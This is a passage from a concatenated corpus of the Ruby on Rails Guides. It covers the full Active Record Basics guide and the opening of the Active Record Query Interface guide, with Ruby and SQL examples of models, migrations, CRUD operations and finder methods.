# Rails Guides corpus (lemans lens-crafting)

Source: https://github.com/rails/rails/tree/main/guides/source at main b24658a9b2c6, fetched 2026-09-13.
Eleven guides concatenated in the order below, unmodified apart from a per-guide banner. agent-lens's lens shape reads a single-file corpus, hence one file.
License: the Rails Guides are MIT-licensed (rails/rails).

Order: active_record_basics, active_record_querying, active_record_validations, active_record_callbacks, active_job_basics, action_controller_overview, active_storage_overview, action_view_overview, testing, security, caching_with_rails.



<!-- ===== guides/source/active_record_basics.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Active Record Basics
====================

This guide is an introduction to Active Record.

After reading this guide, you will know:

* How Active Record fits into the Model-View-Controller (MVC) paradigm.
* What Object Relational Mapping and Active Record patterns are and how
  they are used in Rails.
* How to use Active Record models to manipulate data stored in a relational
  database.
* Active Record schema naming conventions.
* The concepts of database migrations, validations, callbacks, and associations.

--------------------------------------------------------------------------------

What is Active Record?
----------------------

Active Record is part of the M in [MVC][] - the model - which is the layer of
the system responsible for representing data and business logic. Active Record
helps you create and use Ruby objects whose attributes require persistent
storage to a database.

NOTE: What is the difference between Active Record and Active Model? It's
possible to model data with Ruby objects that do *not* need to be backed by a
database. [Active Model](active_model_basics.html) is commonly used for that in
Rails, making Active Record and Active Model both part of the M in MVC, as well
as your own plain Ruby objects.

The term "Active Record" also refers to a software architecture pattern. Active
Record in Rails is an implementation of that pattern. It's also a description of
something called an [Object Relational Mapping][ORM] system. The below sections
explain these terms.

### The Active Record Pattern

The [Active Record pattern is described by Martin Fowler][MFAR] in the book
_Patterns of Enterprise Application Architecture_ as "an object that wraps a row
in a database table, encapsulates the database access, and adds domain logic to
that data." Active Record objects carry both data and behavior. Active Record
classes match very closely to the record structure of the underlying database.
This way users can easily read from and write to the database, as you will see
in the examples below.

### Object Relational Mapping

Object Relational Mapping, commonly referred to as ORM, is a technique that
connects the rich objects of a programming language to tables in a relational
database management system (RDBMS). In the case of a Rails application, these
are Ruby objects. Using an ORM, the attributes of Ruby objects, as well as the
relationship between objects, can be easily stored and retrieved from a database
without writing SQL statements directly. Overall, ORMs minimize the amount of
database access code you have to write.

NOTE: Basic knowledge of relational database management systems (RDBMS) and
structured query language (SQL) is helpful in order to fully understand Active
Record. Please refer to [this SQL tutorial][sqlcourse] (or [this RDBMS
tutorial][rdbmsinfo]) or study them by other means if you would like to learn
more.

### Active Record as an ORM Framework

Active Record gives us the ability to do the following using Ruby objects:

* Represent models and their data.
* Represent associations between models.
* Represent inheritance hierarchies through related models.
* Validate models before they get persisted to the database.
* Perform database operations in an object-oriented fashion.

[MVC]: https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller
[MFAR]: https://www.martinfowler.com/eaaCatalog/activeRecord.html
[ORM]: https://en.wikipedia.org/wiki/Object-relational_mapping
[sqlcourse]: https://www.khanacademy.org/computing/computer-programming/sql
[rdbmsinfo]: https://www.devart.com/what-is-rdbms/

Convention over Configuration in Active Record
----------------------------------------------

When writing applications using other programming languages or frameworks, it
may be necessary to write a lot of configuration code. This is particularly true
for ORM frameworks in general. However, if you follow the conventions adopted by
Rails, you'll write very little to no configuration code when creating Active
Record models.

Rails adopts the idea that if you configure your applications in the same way
most of the time, then that way should be the default. Explicit configuration
should be needed only in those cases where you can't follow the convention.

To take advantage of convention over configuration in Active Record, there are
some naming and schema conventions to follow. And in case you need to, it is
possible to [override naming conventions](#overriding-the-naming-conventions).

### Naming Conventions

Active Record uses this naming convention to map between models (represented by
Ruby objects) and database tables:

Rails will pluralize your model's class names to find the respective database
table. For example, a class named `Book` maps to a database table named `books`.
The Rails pluralization mechanisms are very powerful and capable of pluralizing
(and singularizing) both regular and irregular words in the English language.
This uses the [Active Support](active_support_core_extensions.html#pluralize)
[pluralize](https://api.rubyonrails.org/classes/ActiveSupport/Inflector.html#method-i-pluralize) method.

For class names composed of two or more words, the model class name will follow
the Ruby conventions of using an UpperCamelCase name. The database table name, in
that case, will be a snake_case name. For example:

* `BookClub` is the model class, singular with the first letter of each word
  capitalized.
* `book_clubs` is the matching database table, plural with underscores
  separating words.

Here are some more examples of model class names and corresponding table names:

| Model / Class    | Table / Schema |
| ---------------- | -------------- |
| `Article`        | `articles`     |
| `LineItem`       | `line_items`   |
| `Product`        | `products`     |
| `Person`         | `people`       |

### Schema Conventions

Active Record uses conventions for column names in the database tables as well,
depending on the purpose of these columns.

* **Primary keys** - By default, Active Record will use an integer column named
  `id` as the table's primary key (`bigint` for PostgreSQL, MySQL, and MariaDB,
  `integer` for SQLite). When using [Active Record Migrations](#migrations) to
  create your tables, this column will be automatically created.
* **Foreign keys** - These fields should be named following the pattern
  `singularized_table_name_id` (e.g., `order_id`, `line_item_id`). These are the
  fields that Active Record will look for when you create associations between
  your models.

There are also some optional column names that will add additional features to
Active Record instances:

* `created_at` - Automatically gets set to the current date and time when the
  record is first created.
* `updated_at` - Automatically gets set to the current date and time whenever
  the record is created or updated.
* `lock_version` - Adds [optimistic
  locking](https://api.rubyonrails.org/classes/ActiveRecord/Locking.html) to a
  model.
* `type` - Specifies that the model uses [Single Table
  Inheritance](https://api.rubyonrails.org/classes/ActiveRecord/Base.html#class-ActiveRecord::Base-label-Single+table+inheritance).
* `(association_name)_type` - Stores the type for [polymorphic
  associations](association_basics.html#polymorphic-associations).
* `(table_name)_count` - Used to cache the number of belonging objects on
  associations. For example, if `Article`s have many `Comment`s, a
  `comments_count` column in the `articles` table will cache the number of
  existing comments for each article.

NOTE: While these column names are optional, they are reserved by Active Record.
Steer clear of reserved keywords when naming your table's columns. For example,
`type` is a reserved keyword used to designate a table using Single Table
Inheritance (STI). If you are not using STI, use a different word to accurately
describe the data you are modeling.

Creating Active Record Models
-----------------------------

When generating a Rails application, an abstract `ApplicationRecord` class will
be created in `app/models/application_record.rb`. The `ApplicationRecord` class
inherits from
[`ActiveRecord::Base`](https://api.rubyonrails.org/classes/ActiveRecord/Base.html)
and it's what turns a regular Ruby class into an Active Record model.

`ApplicationRecord` is the base class for all Active Record models in your app.
To create a new model, subclass the `ApplicationRecord` class and you're good to
go:

```ruby
class Book < ApplicationRecord
end
```

This will create a `Book` model, mapped to a `books` table in the database,
where each column in the table is mapped to attributes of the `Book` class. An
instance of `Book` can represent a row in the `books` table. The `books` table
with columns `id`, `title`, and `author`, can be created using an SQL statement
like this:

```sql
CREATE TABLE books (
  id int(11) NOT NULL auto_increment,
  title varchar(255),
  author varchar(255),
  PRIMARY KEY  (id)
);
```

However, that is not how you do it normally in Rails. Database tables in Rails
are typically created using [Active Record Migrations](#migrations) and not raw
SQL. A migration for the `books` table above can be generated like this:

```bash
$ bin/rails generate migration CreateBooks title:string author:string
```

NOTE: If you don't specify a type for a field (e.g., `title` instead of `title:string`), Rails will default to type `string`.

and results in this:

```ruby
# Note:
# The `id` column, as the primary key, is automatically created by convention.
# Columns `created_at` and `updated_at` are added by `t.timestamps`.

# db/migrate/20240220143807_create_books.rb
class CreateBooks < ActiveRecord::Migration[8.2]
  def change
    create_table :books do |t|
      t.string :title
      t.string :author

      t.timestamps
    end
  end
end
```

That migration creates columns `id`, `title`, `author`, `created_at` and
`updated_at`. Each row of this table can be represented by an instance of the
`Book` class with the same attributes: `id`, `title`, `author`, `created_at`,
and `updated_at`. You can access a book's attributes like this:

```irb
irb> book = Book.new
=> #<Book:0x00007fbdf5e9a038 id: nil, title: nil, author: nil, created_at: nil, updated_at: nil>

irb> book.title = "The Hobbit"
=> "The Hobbit"
irb> book.title
=> "The Hobbit"
```

NOTE: You can generate the Active Record model class as well as a matching
migration with the command `bin/rails generate model Book title:string
author:string`. This creates the files `app/models/book.rb`,
`db/migrate/20240220143807_create_books.rb`, and a couple others for testing
purposes.

### Creating Namespaced Models

Active Record models are placed under the `app/models` directory by default. But
you may want to organize your models by placing similar models under their own
folder and namespace. For example, `order.rb` and `review.rb` under
`app/models/book` with `Book::Order` and `Book::Review` class names,
respectively. You can create namespaced models with Active Record.

In the case where the `Book` module does not already exist, the `generate`
command will create everything like this:

```bash
$ bin/rails generate model Book::Order
      invoke  active_record
      create    db/migrate/20240306194227_create_book_orders.rb
      create    app/models/book/order.rb
      create    app/models/book.rb
      invoke    test_unit
      create      test/models/book/order_test.rb
      create      test/fixtures/book/orders.yml
```

If the `Book` module already exists, you will be asked to resolve
the conflict:

```bash
$ bin/rails generate model Book::Order
      invoke  active_record
      create    db/migrate/20240305140356_create_book_orders.rb
      create    app/models/book/order.rb
    conflict    app/models/book.rb
  Overwrite /Users/bhumi/Code/rails_guides/app/models/book.rb? (enter "h" for help) [Ynaqdhm]
```

Once the namespaced model generation is successful, the `Book` and `Order`
classes look like this:

```ruby
# app/models/book.rb
module Book
  def self.table_name_prefix
    "book_"
  end
end

# app/models/book/order.rb
class Book::Order < ApplicationRecord
end
```

Setting the
[table_name_prefix](https://api.rubyonrails.org/classes/ActiveRecord/ModelSchema.html#method-c-table_name_prefix-3D)
in `Book` will allow `Order` model's database table to be named
`book_orders`, instead of plain `orders`.

The other possibility is that you already have a `Book` model that you want
to keep in `app/models`. In that case, you can choose `n` to not overwrite
`book.rb` during the `generate` command.

This will still allow for a namespaced table name for `Book::Order` class,
without needing the `table_name_prefix`:

```ruby
# app/models/book.rb
class Book < ApplicationRecord
  # existing code
end

Book::Order.table_name
# => "book_orders"
```

Overriding the Naming Conventions
---------------------------------

What if you need to follow a different naming convention or need to use your
Rails application with a legacy database? No problem, you can easily override
the default conventions.

Since `ApplicationRecord` inherits from `ActiveRecord::Base`, your application's
models will have a number of helpful methods available to them. For example, you
can use the `ActiveRecord::Base.table_name=` method to customize the table name
that should be used:

```ruby
class Book < ApplicationRecord
  self.table_name = "my_books"
end
```

If you do so, you will have to manually define the class name that is hosting
[the fixtures](testing.html#fixtures) (`my_books.yml`) using the
`set_fixture_class` method in your test definition:

```ruby
# test/models/book_test.rb
class BookTest < ActiveSupport::TestCase
  set_fixture_class my_books: Book
  fixtures :my_books
  # ...
end
```

It's also possible to override the column that should be used as the table's
primary key using the `ActiveRecord::Base.primary_key=` method:

```ruby
class Book < ApplicationRecord
  self.primary_key = "book_id"
end
```

NOTE: **Active Record does not recommend using non-primary key columns named
`id`.** Using a column named `id` which is not a single-column primary key
complicates the access to the column value. The application will have to use the
[`id_value`][] alias attribute to access the value of the non-PK `id` column.

[`id_value`]: https://api.rubyonrails.org/classes/ActiveRecord/ModelSchema.html#method-i-id_value

NOTE: If you try to create a column named `id` which is not the primary key,
Rails will throw an error during migrations such as: `you can't redefine the primary key column 'id' on 'my_books'. To define a custom primary key, pass { id: false } to create_table.`

CRUD: Reading and Writing Data
------------------------------

CRUD is an acronym for the four verbs we use to operate on data: **C**reate,
**R**ead, **U**pdate, and **D**elete. Active Record automatically creates methods
to allow you to read and manipulate data stored in your application's database
tables.

Active Record makes it seamless to perform CRUD operations by using these
high-level methods that abstract away database access details. Note that all of
these convenient methods result in SQL statement(s) that are executed against
the underlying database.

The examples below show a few of the CRUD methods as well as the resulting SQL
statements.

### Create

Active Record objects can be created from a hash, a block, or have their
attributes manually set after creation. The `new` method will return a new,
non-persisted object, while `create` will save the object to the database and
return it.

For example, given a `Book` model with attributes of `title` and `author`, the
`create` method call will create an object and save a new record to the
database:

```ruby
book = Book.create(title: "The Lord of the Rings", author: "J.R.R. Tolkien")

# Note that the `id` is assigned as this record is committed to the database.
book.inspect
# => "#<Book id: 106, title: \"The Lord of the Rings\", author: \"J.R.R. Tolkien\", created_at: \"2024-03-04 19:15:58.033967000 +0000\", updated_at: \"2024-03-04 19:15:58.033967000 +0000\">"
```

While the `new` method will instantiate an object *without* saving it to the
database:

```ruby
book = Book.new
book.title = "The Hobbit"
book.author = "J.R.R. Tolkien"

# Note that the `id` is not set for this object.
book.inspect
# => "#<Book id: nil, title: \"The Hobbit\", author: \"J.R.R. Tolkien\", created_at: nil, updated_at: nil>"

# The above `book` is not yet saved to the database.

book.save
book.id # => 107

# Now the `book` record is committed to the database and has an `id`.
```

If a block is provided, both `create` and `new` will yield the new object to that block for initialization, while only `create` will persist the resulting object to the database:

```ruby
book = Book.new do |b|
  b.title = "Metaprogramming Ruby 2"
  b.author = "Paolo Perrotta"
end

book.save
```

The resulting SQL statement from both `book.save` and `Book.create` look
something like this:

```sql
/* Note that `created_at` and `updated_at` are automatically set. */

INSERT INTO "books" ("title", "author", "created_at", "updated_at") VALUES (?, ?, ?, ?) RETURNING "id"  [["title", "Metaprogramming Ruby 2"], ["author", "Paolo Perrotta"], ["created_at", "2024-02-22 20:01:18.469952"], ["updated_at", "2024-02-22 20:01:18.469952"]]
```

Finally, if you'd like to insert several records **without callbacks or
validations**, you can directly insert records into the database using `insert` or `insert_all` methods:

```ruby
Book.insert(title: "The Lord of the Rings", author: "J.R.R. Tolkien")
Book.insert_all([{ title: "The Lord of the Rings", author: "J.R.R. Tolkien" }])
```

### Read

Active Record provides a rich API for accessing data within a database. You can
query a single record or multiple records, filter them by any attribute, order
them, group them, select specific fields, and do anything you can do with SQL.

```ruby
# Return a collection with all books.
books = Book.all

# Return a single book.
first_book = Book.first
last_book = Book.last
book = Book.take
```

The above results in the following SQL:

```sql
-- Book.all
SELECT "books".* FROM "books"

-- Book.first
SELECT "books".* FROM "books" ORDER BY "books"."id" ASC LIMIT ?  [["LIMIT", 1]]

-- Book.last
SELECT "books".* FROM "books" ORDER BY "books"."id" DESC LIMIT ?  [["LIMIT", 1]]

-- Book.take
SELECT "books".* FROM "books" LIMIT ?  [["LIMIT", 1]]
```

We can also find specific books with `find_by` and `where`. While `find_by`
returns a single record, `where` returns a list of records:

```ruby
# Returns the first book with a given title or `nil` if no book is found.
book = Book.find_by(title: "Metaprogramming Ruby 2")

# Alternative to Book.find_by(id: 42). Will throw an exception if no matching book is found.
book = Book.find(42)
```

The above resulting in this SQL:

```sql
-- Book.find_by(title: "Metaprogramming Ruby 2")
SELECT "books".* FROM "books" WHERE "books"."title" = ? LIMIT ?  [["title", "Metaprogramming Ruby 2"], ["LIMIT", 1]]

-- Book.find(42)
SELECT "books".* FROM "books" WHERE "books"."id" = ? LIMIT ?  [["id", 42], ["LIMIT", 1]]
```

```ruby
# Find all books by a given author, sort by created_at in reverse chronological order.
Book.where(author: "Douglas Adams").order(created_at: :desc)
```

resulting in this SQL:

```sql
SELECT "books".* FROM "books" WHERE "books"."author" = ? ORDER BY "books"."created_at" DESC [["author", "Douglas Adams"]]
```

There are many more Active Record methods to read and query records. You can
learn more about them in the [Active Record Query](active_record_querying.html) guide.

### Update

Once an Active Record object has been retrieved, its attributes can be modified
and it can be saved to the database.

```ruby
book = Book.find_by(title: "The Lord of the Rings")
book.title = "The Lord of the Rings: The Fellowship of the Ring"
book.save
```

A shorthand for this is to use a hash mapping attribute names to the desired
value, like so:

```ruby
book = Book.find_by(title: "The Lord of the Rings")
book.update(title: "The Lord of the Rings: The Fellowship of the Ring")
```

the `update` results in the following SQL:

```sql
/* Note that `updated_at` is automatically set. */

 UPDATE "books" SET "title" = ?, "updated_at" = ? WHERE "books"."id" = ?  [["title", "The Lord of the Rings: The Fellowship of the Ring"], ["updated_at", "2024-02-22 20:51:13.487064"], ["id", 104]]
```

This is useful when updating several attributes at once. Similar to `create`,
using `update` will commit the updated records to the database.

If you'd like to update several records in bulk **without callbacks or
validations**, you can update the database directly using `update_all`:

```ruby
Book.update_all(status: "already own")
```

### Delete

Likewise, once retrieved, an Active Record object can be destroyed, which
removes it from the database.

```ruby
book = Book.find_by(title: "The Lord of the Rings")
book.destroy
```

The `destroy` results in this SQL:

```sql
DELETE FROM "books" WHERE "books"."id" = ?  [["id", 104]]
```

If you'd like to delete several records in bulk, you may use `destroy_by`
or `destroy_all` method:

```ruby
# Find and delete all books by Douglas Adams.
Book.destroy_by(author: "Douglas Adams")

# Delete all books.
Book.destroy_all
```

Additionally, if you'd like to delete several records **without callbacks or
validations**, you can delete records directly from the database using `delete` and `delete_all` methods:

```ruby
Book.find_by(title: "The Lord of the Rings").delete
Book.delete_all
```

Validations
-----------

Active Record allows you to validate the state of a model before it gets written
into the database. There are several methods that allow for different types of
validations. For example, validate that an attribute value is not empty, is
unique, is not already in the database, follows a specific format, and many
more.

Methods like `save`, `create` and `update` validate a model before persisting it
to the database. If the model is invalid, no database operations are performed. In
this case the `save` and `update` methods return `false`. The `create` method still
returns the object, which can be checked for errors. All of these
methods have a bang counterpart (that is, `save!`, `create!` and `update!`),
which are stricter in that they raise an `ActiveRecord::RecordInvalid` exception
when validation fails. A quick example to illustrate:

```ruby
class User < ApplicationRecord
  validates :name, presence: true
end
```

```irb
irb> user = User.new
irb> user.save
=> false
irb> user.save!
ActiveRecord::RecordInvalid: Validation failed: Name can't be blank
```

The `create` method always returns the model, regardless of
its validity. You can then inspect this model for any errors.

```irb
irb> user = User.create
=> #<User:0x000000013e8b5008 id: nil, name: nil>
irb> user.errors.full_messages
=> ["Name can't be blank"]
```

You can learn more about validations in the [Active Record Validations
guide](active_record_validations.html).

Callbacks
---------

Active Record callbacks allow you to attach code to certain events in the
lifecycle of your models. This enables you to add behavior to your models by
executing code when those events occur, like when you create a new record,
update it, destroy it, and so on.

```ruby
class User < ApplicationRecord
  after_create :log_new_user

  private
    def log_new_user
      puts "A new user was registered"
    end
end
```

```irb
irb> @user = User.create
A new user was registered
```

You can learn more about callbacks in the [Active Record Callbacks
guide](active_record_callbacks.html).

Migrations
----------

Rails provides a convenient way to manage changes to a database schema via
migrations. Migrations are written in a domain-specific language and stored in
files which are executed against any database that Active Record supports.

Here's a migration that creates a new table called `publications`:

```ruby
class CreatePublications < ActiveRecord::Migration[8.2]
  def change
    create_table :publications do |t|
      t.string :title
      t.text :description
      t.references :publication_type
      t.references :publisher, polymorphic: true
      t.boolean :single_issue

      t.timestamps
    end
  end
end
```

Note that the above code is database-agnostic: it will run in MySQL, MariaDB,
PostgreSQL, SQLite, and others.

Rails keeps track of which migrations have been committed to the database and
stores them in a neighboring table in that same database called
`schema_migrations`.

To run the migration and create the table, you'd run `bin/rails db:migrate`, and
to roll it back and delete the table, `bin/rails db:rollback`.

You can learn more about migrations in the [Active Record Migrations
guide](active_record_migrations.html).

Associations
------------

Active Record associations allow you to define relationships between models.
Associations can be used to describe one-to-one, one-to-many, and many-to-many
relationships. For example, a relationship like “Author has many Books” can be
defined as follows:

```ruby
class Author < ApplicationRecord
  has_many :books
end
```

The `Author` class now has methods to add and remove books to an author, and
much more.

You can learn more about associations in the [Active Record Associations
guide](association_basics.html).


<!-- ===== guides/source/active_record_querying.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Active Record Query Interface
=============================

This guide covers different ways to retrieve data from the database using Active
Record.

After reading this guide, you will know:

* How to find records using a variety of methods and conditions.
* How to specify the order, retrieved attributes, grouping, and other properties
  of the found records.
* How to retrieve data efficiently.
* How to join tables and work with data from multiple tables.
* How to use scopes to create reusable query logic.
* How to check for the existence of particular records.
* How to perform calculations on Active Record models.
* How to use locking mechanisms for concurrent access control.
* How to run `explain` to analyze queries.

--------------------------------------------------------------------------------

What is the Active Record Query Interface?
------------------------------------------

If you’re used to working directly with raw SQL, Active Record offers a more
readable and expressive way to perform the same operations. It works with most
database systems, including MySQL, MariaDB, PostgreSQL, and SQLite, and its
method-based interface remains consistent regardless of which database you’re
using.

INFO: Basic knowledge of relational database management systems (RDBMS) and
structured query language (SQL) is helpful for getting the most out of this
guide. You can refer to [this SQL tutorial][`sqlcourse`] or [RDBMS
tutorial][`rdbmsinfo`] to learn more.

There are also numerous related guides that you may find useful:

* [Active Record Basics](active_record_basics.html) - Learn about Active Record
  models, associations, and validations
* [Active Record Migrations](active_record_migrations.html) - Learn how to
  modify your database schema
* [Active Record Validations](active_record_validations.html) - Learn how to
  validate data before it goes into the database
* [Active Record Callbacks](active_record_callbacks.html) - Learn how to attach
  code to certain events in the object lifecycle
* [Active Record Associations](association_basics.html) - Learn about the
  connection between Active Record models
* [Composite Primary Keys](active_record_composite_primary_keys.html) - Learn
  how to work with composite primary keys
* [Active Record Transactions](active_record_basics.html#transactions) - Learn
  about database transactions

A Bookstore Model Example
-------------------------

Code examples throughout this guide will refer to one or more of the following
models:

```ruby
class Author < ApplicationRecord
  has_many :books, -> { order(year_published: :desc) }
end
```

```ruby
class Book < ApplicationRecord
  belongs_to :supplier
  belongs_to :author
  has_many :reviews
  has_and_belongs_to_many :orders, join_table: "books_orders"

  scope :in_print, -> { where(out_of_print: false) }
  scope :out_of_print, -> { where(out_of_print: true) }
  scope :old, -> { where(year_published: ...50.years.ago.year) }
  scope :out_of_print_and_expensive, -> { out_of_print.where("price > 500") }
  scope :costs_more_than, ->(amount) { where("price > ?", amount) }
end
```

```ruby
class Customer < ApplicationRecord
  has_many :orders
  has_many :reviews
end
```

```ruby
class Order < ApplicationRecord
  belongs_to :customer
  has_and_belongs_to_many :books, join_table: "books_orders"

  enum :status, [:shipped, :being_packed, :complete, :cancelled]

  scope :created_before, ->(time) { where(created_at: ...time) }
end
```

```ruby
class Review < ApplicationRecord
  belongs_to :customer
  belongs_to :book

  enum :state, [:not_reviewed, :published, :hidden]
end
```

```ruby
class Supplier < ApplicationRecord
  has_many :books
  has_many :authors, through: :books
end
```

NOTE: These models use `id` as the primary key, unless specified otherwise.

![Diagram of all of the bookstore
models](images/active_record_querying/bookstore_models.png)

Retrieving Records from the Database
------------------------------------

To retrieve records from the database, Active Record provides several finder
methods. Each finder method allows you to pass arguments into it to perform
certain queries on your database without writing raw SQL.

This section focuses on some of the most common finder methods:

* [`find`](#find)
* [`take`](#take)
* [`first`](#first)
* [`last`](#last)
* [`find_by`](#find-by)

Other query methods, such as [`where`](#filtering-records) and
[`group`](#grouping-records), are covered later in this guide.

For a more complete list of query and finder methods, see the
[`ActiveRecord::QueryMethods`][] and [`ActiveRecord::FinderMethods`][] API
documentation.

Finder methods that return a collection, such as `where` and `group`, return an
instance of [`ActiveRecord::Relation`][].  Methods that find a single entity,
such as `find` and `first`, return a single instance of the model.

The primary operation of `ActiveRecord::Relation` can be summarized as:

* Convert the supplied options to an equivalent SQL query.
* Fire the SQL query and retrieve the corresponding results from the database.
* Instantiate the equivalent Ruby object of the appropriate model for every
  resulting row.
* Run `after_find` and then `after_initialize` callbacks, if any.

[`ActiveRecord::Relation`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html
[`ActiveRecord::QueryMethods`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html
[`ActiveRecord::FinderMethods`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html
[`distinct`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-distinct
[`eager_load`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-eager_load
[`find`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-find
[`group`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-group
[`having`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-having
[`includes`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-includes
[`joins`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-joins
[`left_outer_joins`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-left_outer_joins
[`limit`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-limit
[`lock`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-lock
[`none`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-none
[`offset`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-offset
[`order`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-order
[`preload`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-preload
[`readonly`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-readonly
[`references`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-references
[`reorder`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-reorder
[`reselect`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-reselect
[`regroup`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-regroup
[`reverse_order`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-reverse_order
[`select`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-select
[`where`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-where
[`with_lock`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Locking/Pessimistic.html#method-i-with_lock
[`sqlcourse`]: https://www.khanacademy.org/computing/computer-programming/sql
[`rdbmsinfo`]: https://www.devart.com/what-is-rdbms/

### Retrieving a Single Record

Active Record provides several different ways of retrieving a single record.

#### `find`

Using the [`find`][] method, you can retrieve the record corresponding to the
specified _primary key_ that matches any supplied options. For example:

```irb
# Find the customer with primary key (id) 10.
store(dev)> customer = Customer.find(10)
=> #<Customer id: 10, first_name: "Ryan">
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers WHERE (customers.id = 10) LIMIT 1
```

The `find` method will raise an `ActiveRecord::RecordNotFound` exception if no
matching record is found.

You can also use this method to query for multiple records. Call the `find`
method and pass in an array of primary keys. The return value will be an array
containing all of the matching records for the supplied _primary keys_. For
example:

```irb
# Find the customers with primary keys 1 and 10.
store(dev)> customers = Customer.find([1, 10]) # OR Customer.find(1, 10)
=> [#<Customer id: 1, first_name: "Lifo">,
    #<Customer id: 10, first_name: "Ryan">]
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers WHERE (customers.id IN (1,10))
```

WARNING: The `find` method will raise an `ActiveRecord::RecordNotFound`
exception unless a matching record is found for **all** of the supplied primary
keys.

If your table uses a [composite primary
key](active_record_composite_primary_keys.html), you'll need to pass an array to
`find` a single record. See the [Composite Primary Keys
guide](active_record_composite_primary_keys.html#using-find) for more details
and examples.

#### `take`

The [`take`][] method retrieves a record without any implicit ordering. For
example:

```irb
store(dev)> customer = Customer.take
=> #<Customer id: 1, first_name: "Lifo">
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers LIMIT 1
```

The `take` method returns `nil` if no record is found and no exception will be
raised.

You can pass in a numerical argument to the `take` method to return up to that
number of results. For example:

```irb
store(dev)> customers = Customer.take(2)
=> [#<Customer id: 1, first_name: "Lifo">,
    #<Customer id: 220, first_name: "Sara">]
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers LIMIT 2
```

The [`take!`][] method behaves exactly like `take`, except that it will raise
`ActiveRecord::RecordNotFound` if no matching record is found.

INFO: Since `take` doesn't specify an `ORDER BY` clause, the retrieved record
may vary depending on the database engine. Without explicit ordering, SQL
doesn't guarantee which record will be returned.

[`take`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-take
[`take!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-take-21

#### `first`

The [`first`][] method finds the first record ordered by primary key (default).
For example:

```irb
store(dev)> customer = Customer.first
=> #<Customer id: 1, first_name: "Lifo">
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers ORDER BY customers.id ASC LIMIT 1
```

The `first` method returns `nil` if no matching record is found and no exception
will be raised.

If your [default scope](active_record_querying.html#applying-a-default-scope)
contains an [`order`](active_record_querying.html#ordering-records) method,
`first` will return the first record according to this ordering.

You can pass in a numerical argument to the `first` method to return up to that
number of results. For example:

```irb
store(dev)> customers = Customer.first(3)
=> [#<Customer id: 1, first_name: "Lifo">,
    #<Customer id: 2, first_name: "Fifo">,
    #<Customer id: 3, first_name: "Filo">]
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers ORDER BY customers.id ASC LIMIT 3
```

If your model uses [composite primary
keys](active_record_composite_primary_keys.html), see the [Composite Primary
Keys guide](active_record_composite_primary_keys.html) for details on finder
behavior and ordering.

On a collection that is ordered using `order`, `first` will return the first
record ordered by the specified attribute for `order`.

```irb
store(dev)> customer = Customer.order(:first_name).first
=> #<Customer id: 2, first_name: "Fifo">
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers ORDER BY customers.first_name ASC LIMIT 1
```

The [`first!`][] method behaves exactly like `first`, except that it will raise
`ActiveRecord::RecordNotFound` if no matching record is found.

[`first`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-first
[`first!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-first-21

#### `last`

The [`last`][] method finds the last record ordered by primary key (default).
For example:

```irb
store(dev)> customer = Customer.last
=> #<Customer id: 221, first_name: "Russel">
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers ORDER BY customers.id DESC LIMIT 1
```

The `last` method returns `nil` if no matching record is found and no exception
will be raised.

If your model uses [composite primary
keys](active_record_composite_primary_keys.html), see the [Composite Primary
Keys guide](active_record_composite_primary_keys.html) for details on finder
behavior and ordering.

If your [default scope](active_record_querying.html#applying-a-default-scope)
contains an [`order`](active_record_querying.html#ordering-records) method,
`last` will return the last record according to this ordering.

You can pass in a numerical argument to the `last` method to return up to that
number of results. For example:

```irb
store(dev)> customers = Customer.last(3)
=> [#<Customer id: 219, first_name: "James">,
    #<Customer id: 220, first_name: "Sara">,
    #<Customer id: 221, first_name: "Russel">]
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers ORDER BY customers.id DESC LIMIT 3
```

